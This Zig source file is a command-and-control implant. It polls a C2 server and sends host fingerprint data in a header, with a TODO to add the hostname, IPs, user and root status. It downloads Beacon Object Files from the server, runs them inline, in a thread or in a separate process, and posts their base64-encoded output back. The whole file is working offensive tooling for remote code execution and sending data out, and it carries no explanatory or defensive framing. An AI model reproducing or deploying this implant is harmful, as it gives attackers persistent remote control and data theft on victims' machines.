const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");

pub const std_options = struct {
    pub const http_disable_tls = true;
    pub const log_level = .info;
};
const c2_host = "127.0.0.1:8000";
const c2_endpoint = "/endpoint";
const jitter = 3;

const debug_proxy_enabled = false;
const debug_proxy_host = "127.0.0.1";
const debug_proxy_port = 8080;

fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]const u8 {
    var headers = std.http.Headers.init(allocator);
    defer headers.deinit();

    var http_client: std.http.Client = .{
        .allocator = allocator,
        .http_proxy = if (debug_proxy_enabled) .{
            .allocator = allocator,
            .headers = headers,
            .protocol = .plain,
            .host = debug_proxy_host,
            .port = debug_proxy_port,
        } else null,
    };
    defer http_client.deinit();

    const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
    defer allocator.free(uri);

    const bof_url = try std.Uri.parse(uri);

    var bof_req = try http_client.open(.GET, bof_url, headers, .{});
    defer bof_req.deinit();

    try bof_req.send(.{});
    try bof_req.wait();

    if (bof_req.response.status != .ok) {
        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(bof_req.response.status),
            bof_req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const bof_content_type = bof_req.response.headers.getFirstValue("Content-Type") orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    if (!std.ascii.eqlIgnoreCase(bof_content_type, "application/octet-stream")) {
        std.log.err(
            "Expected 'Content-Type: application/octet-stream' got '{s}'",
            .{bof_content_type},
        );
        return error.NetworkError;
    }

    const bof_content = try allocator.alloc(u8, @intCast(bof_req.response.content_length.?));
    errdefer allocator.free(bof_content);

    const n = try bof_req.readAll(bof_content);
    if (n != bof_content.len)
        return error.NetworkError;

    return bof_content;
}

const State = struct {
    base64_decoder: std.base64.Base64Decoder,
    base64_encoder: std.base64.Base64Encoder,
    http_client: std.http.Client,
    heartbeat_header: std.http.Headers,
    heartbeat_uri: std.Uri,
    pending_bofs: std.ArrayList(PendingBof),

    fn init(allocator: std.mem.Allocator) !State {
        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        var heartbeat_header = std.http.Headers.init(allocator);

        {
            const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
            const arch_name = target.cpu.model.name;
            const os_name = @tagName(target.os.tag);

            // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
            const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
            defer allocator.free(authz);

            const authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
            defer allocator.free(authz_b64);

            _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
            try heartbeat_header.append("Authorization", authz_b64);
        }

        const http_client: std.http.Client = .{
            .allocator = allocator,
            .http_proxy = if (debug_proxy_enabled) .{
                .allocator = allocator,
                .headers = heartbeat_header,
                .protocol = .plain,
                .host = debug_proxy_host,
                .port = debug_proxy_port,
            } else null,
        };

        return State{
            .base64_decoder = base64_decoder,
            .base64_encoder = base64_encoder,
            .http_client = http_client,
            .heartbeat_header = heartbeat_header,
            .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
        };
    }

    fn deinit(state: *State) void {
        state.http_client.deinit();
        state.heartbeat_header.deinit();
    }
};

const PendingBof = struct {
    context: *bof.Context,
    request_id: []const u8,
};

fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
    const request_id = root.object.get("id").?.string;

    const bof_args = if (root.object.get("args")) |value| bof_args: {
        const len = try state.base64_decoder.calcSizeForSlice(value.string);
        const bof_args = try allocator.alloc(u8, len);
        errdefer allocator.free(bof_args);
        _ = try state.base64_decoder.decode(bof_args, value.string);
        break :bof_args bof_args;
    } else null;
    defer if (bof_args) |args| allocator.free(args);

    const bof_path = root.object.get("path").?.string;

    // fetch bof content
    const bof_content = try fetchBofContent(allocator, bof_path);
    defer allocator.free(bof_content);

    const bof_object = try bof.Object.initFromMemory(bof_content);
    errdefer bof_object.release();

    // process header
    const bof_header = root.object.get("header").?.string;
    var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
    const exec_mode = iter_hdr.next() orelse return error.BadData;
    //TODO: handle 'buffers'
    //const args_spec = iter_hdr.next() orelse return error.BadData;

    var bof_context: ?*bof.Context = null;

    if (std.mem.eql(u8, exec_mode, "inline")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_object.run(@constCast(bof_args));
    } else if (std.mem.eql(u8, exec_mode, "thread")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_object.runAsyncThread(
            @constCast(bof_args),
            null,
            null,
        );
    } else if (std.mem.eql(u8, exec_mode, "process")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_object.runAsyncProcess(
            @constCast(bof_args),
            null,
            null,
        );
    }

    if (bof_context) |context| {
        try state.pending_bofs.append(.{
            .context = context,
            .request_id = try allocator.dupe(u8, request_id),
        });
    } else bof_object.release();
}

fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
    // send heartbeat to C2 and check if any tasks are pending
    var req = try state.http_client.open(.GET, state.heartbeat_uri, state.heartbeat_header, .{});
    defer req.deinit();

    try req.send(.{});
    try req.wait();

    if (req.response.status != .ok) {
        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(req.response.status),
            req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const content_type = req.response.headers.getFirstValue("Content-Type") orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    // task received from C2?
    if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
        const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
        defer allocator.free(resp_content);

        _ = try req.readAll(resp_content);

        var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
        defer parsed.deinit();

        // check type of task to execute:
        // bof - execute bof
        // cmd - execute builtin command (like: sleep 10)
        var root = parsed.value;
        const task = root.object.get("name").?.string;
        const request_id = root.object.get("id").?.string;

        var iter_task = std.mem.tokenize(u8, task, ":");
        const cmd_prefix = iter_task.next() orelse return error.BadData;
        const cmd_name = iter_task.next() orelse return error.BadData;

        if (std.mem.eql(u8, cmd_prefix, "bof")) {
            std.log.info("Executing bof: {s}", .{cmd_name});

            receiveAndLaunchBof(allocator, state, root) catch {
                var options = std.http.Client.FetchOptions{
                    .location = .{ .uri = state.heartbeat_uri },
                    .response_strategy = .none,
                };
                try options.headers.append("Authorization", request_id);
                try options.headers.append("user-agent", "1"); // error code
                var result = try state.http_client.fetch(allocator, options);
                defer result.deinit();
            };
        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
            std.log.info("Executing builtin command: {s}", .{cmd_name});
        }
    }
}

fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
    var pending_bof_index: usize = 0;
    while (pending_bof_index != state.pending_bofs.items.len) {
        const pending_bof = state.pending_bofs.items[pending_bof_index];

        if (pending_bof.context.isRunning()) {
            pending_bof_index += 1;
        } else {
            const context = pending_bof.context;

            if (context.getOutput()) |output| {
                std.log.info("Bof output:\n{s}", .{output});

                const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
                defer allocator.free(out_b64);

                _ = state.base64_encoder.encode(out_b64, output);

                var headers = std.http.Headers.init(allocator);
                defer headers.deinit();
                try headers.append("content-type", "text/plain");
                try headers.append("Authorization", pending_bof.request_id);

                var request = try state.http_client.open(.POST, state.heartbeat_uri, headers, .{});
                defer request.deinit();
                request.transfer_encoding = .{ .content_length = out_b64.len };

                try request.send(.{});
                try request.writeAll(out_b64);
                try request.finish();
            }

            context.getObject().release();
            context.release();
            allocator.free(pending_bof.request_id);

            _ = state.pending_bofs.swapRemove(pending_bof_index);
        }
    }
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var state = try State.init(allocator);
    defer state.deinit();

    try bof.initLauncher();
    defer bof.releaseLauncher();

    while (true) {
        processCommands(allocator, &state) catch {};
        processPendingBofs(allocator, &state) catch {};
        std.time.sleep(jitter * 1e9);
    }
}
